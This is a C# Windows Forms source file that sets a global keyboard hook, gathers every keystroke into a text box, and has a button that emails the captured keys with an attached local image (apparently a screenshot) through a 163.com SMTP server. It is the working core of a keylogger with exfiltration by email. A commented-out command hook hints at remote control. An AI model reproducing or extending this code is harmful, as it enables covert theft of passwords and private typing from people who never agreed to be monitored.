using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.Net.Mail;
using System.Threading;

namespace KeyboardHookDll
{
    public partial class frmNew : Form
    {
        private bool _IsStop_Catching_Keyboard = false;
        /// <summary>
        /// 键盘Hook
        /// </summary>
        private KeyboardHook _Keyboardhook = new KeyboardHook();

        public frmNew()
        {
            InitializeComponent();
        }

        private void frmNew_Load(object sender, EventArgs e)
        {
            
            _Keyboardhook.KeyDown +=new KeyEventHandler(Keyboardhook_KeyDownEvent);
            
        }



        private void Keyboardhook_KeyDownEvent(object sender, KeyEventArgs e)
        {
            if (!_IsStop_Catching_Keyboard)
            {
                try
                {
                    //SendCmd("$GetKeyboard", e.KeyCode.ToString());
                    this.BeginInvoke((MethodInvoker)delegate {  textBox1.Text += e.KeyCode.ToString(); });                    
                }
                catch { }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            //试验证明子线程无法启动全局HOOK，只有在主线程里才可以
            Thread th = new Thread(new ThreadStart(() => { _Keyboardhook.Start(); }));
            //_Keyboardhook.Start();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            _Keyboardhook.Stop();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            MailMessage MailMessage = new MailMessage();
            //这个是我们的邮件对象,包含主题,内容等主要属性
            SmtpClient SmtpServer = new SmtpClient();
            //这个是我们的SMTP客户端对象,通过这个对象将我们的邮件发送出去


            MailMessage.From = new MailAddress("自己的邮箱账号", "测试邮件", System.Text.Encoding.UTF8);
            //例如xxx@163.com 'MailMessage对象的From属性意为邮件的发送者,顾名思义在此处设置邮件的发件人.
            MailMessage.To.Add("自己的邮箱账号");
            //例如xxx@163.com 'MailMessage对象的To属性意为该邮件的收件人集合,使用该属性的Add方法来添加收件人
            MailMessage.Subject = "大家好!~我是邮件标题";
            //Subject属性就是邮件的标题内容
            //MailMessage.Body = "大家好!~我是邮件内容" 'Body属性是邮件的内容
            MailMessage.Priority = MailPriority.Normal;
            //Normal是普通优先级,这里还可以设置成High或Low
            SmtpServer.Host = "SMTP.163.com";
            //这里设置我们的SMTP服务器,例如smtp.163.com
            SmtpServer.Credentials = new System.Net.NetworkCredential("自己的邮箱账号", "邮箱密码");
            //这里的用户名和密码用于SMTP服务器认证
            //SmtpServer.Timeout = 100 '设定发送超时的时间，默认是100秒

            MailMessage.Attachments.Add(new Attachment("d:\\debug.png"));
            MailMessage.Body = textBox1.Text.Trim();

            SmtpServer.Send(MailMessage);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            //试验证明子线程无法启动全局HOOK，只有在主线程里才可以
            _Keyboardhook.Start();
        }
    }
}
